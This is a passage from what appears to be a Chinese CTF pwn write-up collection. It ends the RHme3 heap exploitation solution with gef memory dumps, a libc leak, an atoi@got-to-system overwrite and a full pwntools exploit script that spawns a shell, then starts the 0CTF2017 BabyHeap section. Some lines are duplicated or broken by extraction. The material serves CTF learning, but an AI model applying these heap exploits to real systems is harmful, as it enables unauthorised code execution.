0x6041b0: 0x4343434343434343 0x4343434343434343
0x6041c0: 0x4343434343434343 0x4343434343434343
0x6041d0: 0x4343434343434343 0x4343434343434343
0x6041e0: 0x4343434343434343 0x4343434343434343
0x6041f0: 0x0000000000000000 0x0000000000020e11
 ?v 0x00007ffff7dd1b78 - 0x00007ffff7a0d000
0x3c4b78
再次 free，将 player 2 释放，因为 player 1 也是被释放的状态，所以两个 chunk
会被合并（其实 player 是 fast chunk，不会被合并，真正合并的是 name
chunk）：
free(2)
gef➤ x/4gx 0x603180
0x603180 : 0x0000000000604010 0x0000000000000000
0x603190 : 0x0000000000000000 0x00000000000000
00
gef➤ x/70gx 0x604010-0x10
0x604000: 0x0000000000000000 0x0000000000000021 : 0x0000000000604010 0x0000000000604150
1056
6.1.9 pwn RHme3 Exploitation
0x603190 : 0x0000000000000000 0x00000000000000
00
gef➤ x/70gx 0x604010-0x10
0x604000: 0x0000000000000000 0x0000000000000021  system@got
edit(p64(system))
# get shell
p.recvuntil('choice: ')
p.sendline('sh')
函数 atoi@got 已经被我们覆盖为 system@got，当调用 atoi 时，实际上是执行了
system('sh')：
gef➤ p atoi
$2 = {int (const char *)} 0x7ffff7a43e80 
gef➤ x/gx 0x603110
0x603110: 0x00007ffff7a52390
到这里，我们可以重新启用 ASLR 了，该保护机制已经被绕过。
Bingo!!!
1058
6.1.9 pwn RHme3 Exploitation
$ python exp.py
[+] Opening connection to 127.0.0.1 on port 10001: Done
[*] leak => 0x7fcd41824b78
[*] libc => 0x7fcd41460000
[*] system => 0x7fcd414a5390
[*] Switching to interactive mode
$ whoami
firmy
exploit
完整的 exp 如下：
from pwn import *
# context.log_level = 'debug'
p = remote('127.0.0.1', 10001)
# p = process('./main.elf')
def alloc(name, attack = 1, defense = 2, speed = 3, precision = 4
):
p.recvuntil('choice: ')
p.sendline('1')
p.recvuntil('name: ')
p.sendline(name)
p.recvuntil('points: ')
p.sendline(str(attack))
p.recvuntil('points: ')
p.sendline(str(defense))
p.recvuntil('speed: ')
p.sendline(str(speed))
p.recvuntil('precision: ')
p.sendline(str(precision))
def free(idx):
p.recvuntil('choice: ')
p.sendline('2')
1059
6.1.9 pwn RHme3 Exploitation
p.recvuntil('index: ')
p.sendline(str(idx))
def select(idx):
p.recvuntil('choice: ')
p.sendline('3')
p.recvuntil('index: ')
p.sendline(str(idx))
def edit(name):
p.recvuntil('choice: ')
p.sendline('4')
p.recvuntil('choice: ')
p.sendline('1')
p.recvuntil('name: ')
p.sendline(name)
def show():
p.recvuntil('choice: ')
p.sendline('5')
# gdb.attach(p, '''
# b *0x00402205
# c
# ''')
atoi_got = 0x603110
alloc('A' * 0x60)
alloc('B' * 0x80)
alloc('C' * 0x80)
select(1)
free(1)
show()
p.recvuntil('Name: ')
leak = u64(p.recv(6).ljust(8, '\x00'))
libc = leak - 0x3c4b78 # 0x3c4b78 = leak - libc
system = libc + 0x045390 # $ readelf -s libc-2.23.so | grep s
1060
6.1.9 pwn RHme3 Exploitation
ystem@
log.info("leak => 0x%x" % leak)
log.info("libc => 0x%x" % libc)
log.info("system => 0x%x" % system)
free(2)
alloc('D'*16 + p64(atoi_got))
# atoi@got -> system@got
edit(p64(system))
# get shell
p.recvuntil('choice: ')
p.sendline('sh')
p.interactive()
参考资料
https://ctftime.org/task/4528
1061
6.1.10 pwn 0CTF2017 BabyHeap2017
6.1.10 pwn 0CTF2017 BabyHeap2017
题目复现
题目解析
漏洞利用
参考资料
下载文件
题目复现
这个题目给出了二进制文件。在 Ubuntu 16.04 上，libc 就用自带的。
$ file babyheap
babyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV)
, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, f
or GNU/Linux 2.6.32, BuildID[sha1]=9e5bfa980355d6158a76acacb7bda
01f4e3fc1c2, stripped
$ checksec -f babyheap
RELRO STACK CANARY NX PIE
RPATH RUNPATH FORTIFY Fortified Fortifiable FILE
Full RELRO Canary found NX enabled PIE enabled
No RPATH No RUNPATH Yes 0 2 babyhe
ap
$ file /lib/x86_64-linux-gnu/libc-2.23.so
/lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object
, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter
/lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088a6e00a1814622219f
346b41e775b8dd46c518, for GNU/Linux 2.6.32, stripped
64 位程序，保护全开。
把它运行起来：
$ socat tcp4-listen:10001,reuseaddr,fork exec:./babyheap &
1062
6.1.10 pwn 0CTF2017 BabyHeap2017
一个典型的堆利用题目：
$ ./babyheap
===== Baby Heap in 2017 =====
1. Allocate
2. Fill
3. Free
4. Dump
5. Exit
Command: 1 // 分配一个指定大小的 chunk
Size: 5
Allocate Index 0
1. Allocate
2. Fill
3. Free